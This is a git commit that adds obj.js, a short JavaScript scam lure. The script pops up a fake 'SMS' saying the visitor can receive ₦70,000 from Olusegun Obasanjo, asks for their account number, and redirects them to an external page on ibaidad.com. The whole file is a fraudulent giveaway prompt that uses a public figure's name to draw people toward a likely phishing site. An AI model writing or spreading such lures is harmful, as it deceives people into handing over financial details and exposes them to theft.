f229efa3bae558e4d9e259a4b5e7883dd312b827
mfednewblog8 <nsikakimoh68@gmail.com>
2026-06-20 11:02:52 +0100

    Create obj.js

---
+++ obj.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦70,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦70,000 From Olusegun Obasanjo, click OK to Enter Your Acc. Number','WITHDRAW ₦70,000');
+if (password != 'WITHDRAW ₦70,000') {
+location.href='https://ibaidad.com/obj-birthday.html';
+}
